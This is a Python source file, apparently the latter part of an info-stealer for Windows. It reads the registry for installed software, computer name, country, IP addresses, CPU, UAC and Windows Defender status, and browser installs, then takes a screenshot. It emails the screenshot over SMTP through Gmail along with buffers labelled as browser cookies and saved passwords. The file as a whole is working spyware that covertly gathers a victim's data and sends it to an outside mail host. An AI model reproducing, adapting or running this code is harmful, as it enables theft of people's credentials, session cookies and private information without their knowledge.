                    retCode = winreg.EnumKey(Hkey, i)

                    if retCode:
                        if "{" and "}" in retCode:
                            new_path = path_four + retCode

                            open_sub_path = winreg.OpenKeyEx(
                                winreg.HKEY_LOCAL_MACHINE,
                                new_path,
                                0,
                                winreg.KEY_READ
                            )

                            if open_sub_path:
                                try:
                                    read_name = winreg.QueryValueEx(
                                        open_sub_path,
                                        "DisplayName"
                                    )[0]

                                    if read_name:
                                        arr_normal_name.append(read_name)
                                        buf_installed_software.write(read_name + "\t\t")

                                        read_version = winreg.QueryValueEx(
                                            open_sub_path,
                                            "DisplayVersion"
                                        )[0]

                                        if read_version:
                                            arr_normal_version.append(read_version)

                                            buf_installed_software.write(read_version + "\n")

                                    winreg.OpenKeyEx(
                                        winreg.HKEY_LOCAL_MACHINE,
                                        path,
                                        0,
                                        winreg.KEY_READ
                                    )
                                except OSError as e:
                                    print("Search")
                        else:
                            arr_normal_name.append(retCode)
                            buf_installed_software.write(retCode + "\n")

        else:
            print("bad")
    except Exception as exc:
        print('Exception show_programs(): ', exc)


def computer_name():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            try:
                buf_user_information.write("Computer Name:" + "\t")

                read_value = winreg.QueryValueEx(
                    Hkey,
                    "ComputerName"
                )[0]

                if read_value:
                    buf_user_information.write(read_value + "\n")

            except OSError as e:
                print("search")
    except Exception as exc:
        print('Exception computer_name(): ', exc)


def location_person():
    try:
        location_table = {
            2: "Антигуа и Барбуда",
            3: "Афганистан",
            4: "Алжир",
            5: "Азербайджан",
            6: "Албания",
            7: "Армения",
            8: "Андорра",
            9: "Ангола",
            10: "Американское Самоа",
            11: "Аргентина",
            12: "Австралия",
            14: "Австрия",
            17: "Бахрейн",
            18: "Барбадос",
            19: "Ботсвана",
            20: "Бермудские о-ва",
            21: "Бельгия",
            22: "Багамы",
            23: "Бангладеш",
            24: "Белиз",
            25: "Босния и Герцеговина",
            26: "Боливия",
            27: "Мьянма",
            28: "Бенин",
            29: "Беларусь",
            30: "Соломоновы Острова",
            32: "Бразилия",
            34: "Бутан",
            35: "Болгария",
            37: "Бруней-Даруссалам",
            38: "Бурунди",
            39: "Канада",
            40: "Камбоджа",
            41: "Чад",
            42: "Шри-Ланка",
            43: "Конго",
            44: "Демократическая Республика Конго",
            45: "Китай",
            46: "Чили",
            49: "Камерун",
            50: "Коморы",
            51: "Колумбия",
            54: "Коста-Рика",
            55: "Центрально-Африканская Республика",
            56: "Куба",
            57: "Кабо-Верде",
            59: "Кипр",
            61: "Дания",
            62: "Джибути",
            63: "Доминика",
            65: "Доминиканская Республика",
            66: "Эквадор",
            67: "Египет",
            68: "Ирландия",
            69: "Экваториальная Гвинея",
            70: "Эстония",
            71: "Эритрея",
            72: "Эль-Сальвадор",
            73: "Эфиопия",
            75: "Чешская Республика",
            77: "Финляндия",
            78: "Фиджи",
            80: "Федеративные Штаты Микронезии",
            81: "Фарерские о-ва",
            84: "Франция",
            86: "Гамбия",
            87: "Габон",
            88: "Грузия",
            89: "Гана",
            90: "Гибралтар",
            91: "Гренада",
            93: "Гренландия",
            94: "Германия",
            98: "Греция",
            99: "Гватемала",
            100: "Гвинея",
            101: "Гайана",
            103: "Гаити",
            104: "Гонконг (САР)",
            106: "Гондурас",
            108: "Хорватия",
            109: "Венгрия",
            110: "Исландия",
            111: "Индонезия",
            113: "Индия",
            114: "Британская территория в Индийском океане",
            116: "Иран",
            117: "Израиль",
            118: "Италия",
            119: "Кот-д'Ивуар",
            121: "Ирак",
            122: "Япония",
            124: "Ямайка",
            125: "Ян-Майен",
            126: "Иордания",
            127: "Джонстон Атолл",
            129: "Кения",
            130: "Киргизстан",
            131: "КНДР",
            133: "Кирибати",
            134: "Корея",
            136: "Кувейт",
            137: "Казахстан",
            138: "Лаос",
            139: "Ливан",
            140: "Латвия",
            141: "Литва",
            142: "Либерия",
            143: "Словакия",
            145: "Лихтенштейн",
            146: "Лесото",
            147: "Люксембург",
            148: "Ливия",
            149: "Мадагаскар",
            151: "Макао (САР)",
            152: "Молдова",
            154: "Монголия",
            156: "Малави",
            157: "Мали",
            158: "Монако",
            159: "Марокко",
            160: "Маврикий",
            162: "Мавритания",
            163: "Мальта",
            164: "Оман",
            165: "Мальдивы",
            166: "Мексика",
            167: "Малайзия",
            168: "Мозамбик",
            173: "Нигер",
            174: "Вануату",
            175: "Нигерия",
            176: "Нидерланды",
            177: "Норвегия",
            178: "Непал",
            180: "Науру",
            181: "Суринам",
            182: "Никарагуа",
            183: "Новая Зеландия",
            184: "Палестинская Автономия",
            185: "Парагвай",
            187: "Перу",
            190: "Пакистан",
            191: "Польша",
            192: "Панама",
            193: "Португалия",
            194: "Папуа — Новая Гвинея",
            195: "Палау",
            196: "Гвинея-Бисау",
            197: "Катар",
            198: "Реюньон",
            199: "Маршалловы о-ва",
            200: "Румыния",
            201: "Филиппины",
            202: "Пуэрто-Рико",
            203: "Россия",
            204: "Руанда",
            205: "Саудовская Аравия",
            206: "Сен-Пьер и Микелон",
            207: "Сент-Киттс и Невис",
            208: "Сейшельские Острова",
            209: "Южно-Африканская Республика",
            210: "Сенегал",
            212: "Словения",
            213: "Сьерра-Леоне",
            214: "Сан-Марино",
            215: "Сингапур",
            216: "Сомали",
            217: "Испания",
            218: "Сент-Люсия",
            219: "Судан",
            220: "Шпицберген",
            221: "Швеция",
            222: "Сирия",
            223: "Швейцария",
            224: "ОАЭ",
            225: "Тринидад и Тобаго",
            227: "Таиланд",
            228: "Таджикистан",
            231: "Тонга",
            232: "Того",
            233: "Сан-Томе и Принсипи",
            234: "Тунис",
            235: "Турция",
            236: "Тувалу",
            237: "Тайвань",
            238: "Туркменистан",
            239: "Танзания",
            240: "Уганда",
            241: "Украина",
            242: "Соединенное Королевство",
            244: "США",
            245: "Буркина-Фасо",
            246: "Уругвай",
            247: "Узбекистан",
            248: "Сент-Винсент и Гренадины",
            249: "Венесуэла",
            251: "Вьетнам",
            252: "США (США)",
            253: "Ватикан",
            254: "Намибия",
            258: "Остров Уэйк",
            259: "Самоа",
            260: "Свазиленд",
            261: "Йемен",
            263: "Замбия",
            264: "Зимбабве",
            269: "Сербия и Черногория (бывшая)",
            270: "Черногория",
            271: "Сербия",
            273: "Кюрасао",
            276: "Южный Судан",
            300: "Ангилья",
            301: "Антарктика",
            302: "Аруба",
            303: "Остров Вознесения",
            304: "Ашморе и Картиер острова",
            305: "Остров Мидуэй",
            306: "Остров Буве",
            307: "Острова Кайман",
            308: "Острова каналов",
            309: "Остров Рождества",
            310: "Остров Клиппертон",
            311: "Кокосовые о-ва",
            312: "Острова Кука",
            313: "О-ва Кораллового моря",
            314: "Диего Гарсиа",
            315: "Фолклендские о-ва",
            317: "Французская Гвиана",
            318: "Французская Полинезия",
            319: "Французские Южные Территории",
            321: "Гваделупа",
            322: "Гуам",
            323: "Отсек Гуантанамо",
            324: "Гернси",
            325: "Остров Херд и острова Макдональд",
            326: "Остров Ховланд",
            327: "Остров Джарвис",
            328: "Джерси",
            329: "Кингман риф",
            330: "Мартиника",
            331: "Майотта",
            332: "Монтсеррат",
            333: "Нидерландские Антильские о-ва (бывшая)",
            334: "Новая Каледония",
            335: "Ниуэ",
            336: "О-в Норфолк",
            337: "Северные Марианские о-ва",
            338: "Палмира Атолл",
            339: "О-ва Питкэрн",
            340: "Остров рота",
            341: "Сайпан",
            342: "Южная Георгия и Южные Сандвичевы о-ва",
            343: "Святая Елена, Вознесения и Тристан-да-Кунья",
            346: "Остров Тиниан",
            347: "Токелау",
            348: "Тристан Da Кунья",
            349: "Острова Теркс и Кайкос",
            351: "Виргинские о-ва (Великобритания)",
            352: "Уоллис и Футуна",
            742: "Африка",
            2129: "Азия",
            10541: "Европа",
            15126: "Остров Мэн",
            19618: "Северная Македония",
            20900: "Меланесиа",
            21206: "Федеративные Штаты Микронезии",
            21242: "Острова Мидуэй",
            23581: "Северная Америка",
            26286: "Полинезия",
            27082: "Центральная Америка",
            27114: "Океания",
            30967: "Синт-Мартен",
            31396: "Южная Америка",
            31706: "Сен-Мартен",
            39070: "World",
            42483: "Западная Африка",
            42484: "Ближний Африка",
            42487: "Северная Африка",
            47590: "Центральная Азия",
            47599: "South-Eastern Азия",
            47600: "Восточная Азия",
            47603: "Восточная Африка",
            47609: "Восточная Европа",
            47610: "Южная Европа",
            47611: "Ближний Восток",
            47614: "Южная Азия",
            7299303: "Тимор-Лесте",
            9914689: "Косово",
            10026358: "Северная и Южная Америка",
            10028789: "Аландские острова",
            10039880: "Карибские о-ва",
            10039882: "Северная Европа",
            10039883: "Южная Африка",
            10210824: "Западная Европа",
            10210825: "Австралия и Новая Зеландия",
            161832015: "Сен-Бартельми",
            161832256: "США Малые Тихоокеанские Отдаленные Острова США",
            161832257: "Латинская Америка и Карибский бассейн",
            161832258: "Бонайре, Синт-Эстатиус и Саба"
        }
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_CURRENT_USER,
            "Control Panel\\International\\Geo",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            try:
                buf_user_information.write("Location:" + "\t")

                read_value = winreg.QueryValueEx(
                    Hkey,
                    "Nation"
                )[0]

                if read_value:
                    result = location_table[int(read_value)]
                    if len(result) > 0:
                        buf_user_information.write(result + "\n")
                    else:
                        buf_user_information.write("UNKNOWN" + "\n")

            except OSError as e:
                print("search")
    except Exception as exc:
        print('Exception location_person(): ', exc)


def check_hardware():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "HARDWARE\\DESCRIPTION\\System\\CentralProcessor",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            subkeys = winreg.QueryInfoKey(Hkey)[0]

            if subkeys > 0:
                buf_user_information.write("\n" + "Hardwares:" + "\n")
                for i in range(0, subkeys):
                    retCode = winreg.EnumKey(Hkey, i)

                    if retCode:
                        new_path = r"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\" + retCode

                        open_sub_path = winreg.OpenKeyEx(
                            winreg.HKEY_LOCAL_MACHINE,
                            new_path,
                            0,
                            winreg.KEY_READ
                        )

                        if open_sub_path:
                            try:
                                read_value = winreg.QueryValueEx(
                                    open_sub_path,
                                    "ProcessorNameString"
                                )[0]

                                if read_value:
                                    buf_user_information.write(read_value + "\n")
                                else:
                                    print("error open path in check_hardware function")
                            except OSError as e:
                                print("search")

                        winreg.OpenKeyEx(
                            winreg.HKEY_LOCAL_MACHINE,
                            "HARDWARE\\DESCRIPTION\\System\\CentralProcessor",
                            0,
                            winreg.KEY_READ
                        )
    except Exception as exc:
        print('Exception check_hardware(): ', exc)


def check_ip():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            subkeys = winreg.QueryInfoKey(Hkey)[0]

            if subkeys > 0:
                buf_user_information.write("\n" + "IP address: \t")
                for i in range(0, subkeys):
                    retCode = winreg.EnumKey(Hkey, i)

                    if retCode:
                        try:
                            new_path = r"SYSTEM\\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\" + retCode

                            open_sub_path = winreg.OpenKeyEx(
                                winreg.HKEY_LOCAL_MACHINE,
                                new_path,
                                0,
                                winreg.KEY_READ
                            )

                            if open_sub_path:
                                read_value = winreg.QueryValueEx(
                                    open_sub_path,
                                    "DhcpIPAddress"
                                )[0]

                                if read_value:
                                    buf_user_information.write(read_value + "\n")

                            winreg.OpenKeyEx(
                                winreg.HKEY_LOCAL_MACHINE,
                                "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
                                0,
                                winreg.KEY_READ
                            )

                        except OSError as e:
                            print("Search")
    except Exception as exc:
        print('Exception check_ip(): ', exc)


def keyboard_layouts():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\MUI\\UILanguages",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            subkeys = winreg.QueryInfoKey(Hkey)[0]

            if subkeys > 0:
                buf_user_information.write("\n" + "Available KeyboardLayouts:" + "\n")
                for i in range(0, subkeys):
                    retCode = winreg.EnumKey(Hkey, i)

                    if retCode:
                        buf_user_information.write(retCode + "\n")
    except Exception as exc:
        print('Exception keyboard_layouts(): ', exc)


def check_defender():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            try:
                buf_user_information.write("\n" + "Windows Defender:" + "\n")

                read_value_av = winreg.QueryValueEx(
                    Hkey,
                    "DisableAntiVirus"
                )[0]

                read_value_as = winreg.QueryValueEx(
                    Hkey,
                    "DisableAntiSpyware"
                )[0]

                if read_value_av == 0:
                    buf_user_information.write("Antivirus Windows Defender is activated" + "\n")
                else:
                    buf_user_information.write("Antivirus Windows Defender isn't activated" + "\n")

                if read_value_as == 0:
                    buf_user_information.write("AntiSpyware Windows Defender is activated" + "\n")
                else:
                    buf_user_information.write("AntiSpyware Windows Defender isn't activated" + "\n")
            except OSError as e:
                print("search")
    except Exception as exc:
        print('Exception check_defender(): ', exc)


def check_lua():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            try:
                buf_user_information.write("\n" + "UAC:" + "\n")

                read_value = winreg.QueryValueEx(
                    Hkey,
                    "EnableLUA"
                )[0]

                if read_value == 1:
                    buf_user_information.write("UAC is activated" + "\n")
                else:
                    buf_user_information.write("UAC is isn't activated" + "\n")
            except OSError as e:
                print("search")
    except Exception as exc:
        print('Exception check_lua(): ', exc)


def check_browsers(path, path_four, need_browser):
    try:
        browsers = ["Google Chrome", "Microsoft Edge", "Mozilla Firefox"]

        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            path,
            0,
            winreg.KEY_READ
        )

        if Hkey:
            subkeys = winreg.QueryInfoKey(Hkey)[0]
            if subkeys:
                for i in range(0, subkeys):
                    retCode = winreg.EnumKey(Hkey, i)

                    if retCode:
                        if browsers[need_browser] == retCode:
                            new_path = path_four + retCode

                            open_sub_path = winreg.OpenKeyEx(
                                winreg.HKEY_LOCAL_MACHINE,
                                new_path,
                                0,
                                winreg.KEY_READ
                            )

                            if open_sub_path:
                                try:
                                    read_name = winreg.QueryValueEx(
                                        open_sub_path,
                                        "DisplayName"
                                    )[0]

                                    if read_name:
                                        buf_installed_browsers.write("Name: " + read_name)

                                        read_version = winreg.QueryValueEx(
                                            open_sub_path,
                                            "DisplayVersion"
                                        )[0]

                                        try:
                                            read_path = winreg.QueryValueEx(
                                                open_sub_path,
                                                "InstallLocation"
                                            )[0]
                                        except OSError as e:
                                            print(e)

                                        if read_path:
                                            buf_installed_browsers.write("\t Path: " + read_path)
                                        else:
                                            buf_installed_browsers.write("\t Path: -")

                                        if read_version:
                                            buf_installed_browsers.write("\t Version: " + read_version + "\n")
                                        else:
                                            buf_installed_browsers.write("\t Version: -" + "\n")
                                except OSError as e:
                                    print("search")
                        else:
                            if need_browser == 2:
                                if browsers[need_browser] in retCode:
                                    new_path = path_four + retCode

                                    open_sub_path = winreg.OpenKeyEx(
                                        winreg.HKEY_LOCAL_MACHINE,
                                        new_path,
                                        0,
                                        winreg.KEY_READ
                                    )

                                    if open_sub_path:
                                        try:
                                            read_name = winreg.QueryValueEx(
                                                open_sub_path,
                                                "DisplayName"
                                            )[0]

                                            if read_name:
                                                buf_installed_browsers.write("Name: " + read_name)

                                                read_version = winreg.QueryValueEx(
                                                    open_sub_path,
                                                    "DisplayVersion"
                                                )[0]

                                                try:
                                                    read_path = winreg.QueryValueEx(
                                                        open_sub_path,
                                                        "InstallLocation"
                                                    )[0]
                                                except OSError as e:
                                                    print(e)

                                                if read_path:
                                                    buf_installed_browsers.write("\t Path: " + read_path)
                                                else:
                                                    buf_installed_browsers.write("\t Path: -")

                                                if read_version:
                                                    buf_installed_browsers.write("\t Version: " + read_version + "\n")
                                                else:
                                                    buf_installed_browsers.write("\t Version: -" + "\n")
                                        except OSError as e:
                                            print("search")
    except Exception as exc:
        print('Exception check_browsers(): ', exc)


# Делаем изображение экрана
from PIL import ImageGrab

snapshot = ImageGrab.grab()

cimage = io.BytesIO()
snapshot.save(cimage, format="BMP")
cimage.seek(0)

# Отправка полученных данных по почте
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from smtplib import SMTP_SSL as SMTP


def send_email(subject, sender, SMTPserver, username, password, destination):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = destination

        data = [
            buf_cookies_google,
            buf_cookies_google_2,
            buf_cookies_opera,
            buf_cookies_microsoft,
            buf_cookies_firefox,
            buf_passwords_google,
            buf_passwords_opera,
            buf_passwords_microsoft,
            buf_passwords_firefox,
            buf_installed_software,
            buf_user_information,
            buf_installed_browsers
        ]

        data_dict = {
            0: 'cookies_google',
            1: 'cookies_google_2',
            2: 'cookies_opera',
            3: 'cookies_microsoft',
            4: 'cookies_firefox',
            5: 'passwords_google',
            6: 'passwords_opera',
            7: 'passwords_microsoft',
            8: 'passwords_firefox',
            9: 'buf_installed_software',
            10: 'buf_user_information',
            11: 'buf_installed_browsers'
        }

        for idx, val in enumerate(data):
            data = val.getvalue()
            msg.attach(MIMEText("Labour"))
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(data)
            encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename="{data_dict[idx]}.txt"')
            msg.attach(attachment)

        image = MIMEImage(cimage.read(), name=os.path.basename('screenshot.png'))
        msg.attach(image)

        conn = SMTP(SMTPserver, 465)
        conn.set_debuglevel(False)
        conn.login(username, password)
        conn.sendmail(sender, destination, msg.as_string())
        conn.close()
    except Exception as exc:
        print('Exception send_email(): ', exc)


def main():
    try:
        operating_system = check_operative()

        path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        path_four = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
        show_programs(path, path_four)

        if "Windows 7" in operating_system:
            print("operation is exist Windows 7")
        else:
            path_two = r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            path_four64 = r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
            show_programs(path_two, path_four64)

        buf_user_information.write("Operation System:")
        buf_user_information.write("\t")
        buf_user_information.write(operating_system + "\n")
        computer_name()
        location_person()
        check_ip()
        keyboard_layouts()
        check_hardware()
        check_lua()
        check_defender()

        path_one = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        path_four = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
        check_browsers(path_one, path_four, 0)
        check_browsers(path_one, path_four, 1)
        check_browsers(path_one, path_four, 2)

        path_one64 = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        path_four64 = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
        check_browsers(path_one64, path_four64, 0)
        check_browsers(path_one64, path_four64, 1)
        check_browsers(path_one64, path_four64, 2)

        SMTPserver = "smtp.gmail.com"
        sender = "sender@gmail.com"
        destination = 'destination@gmail.com'
        USERNAME = "sender@gmail.com"
        PASSWORD = "password"
        subject = "Sent from Python"
        send_email(subject, sender, SMTPserver, USERNAME, PASSWORD, destination)
    except Exception as exc:
        print('Exception main(): ', exc)


main()
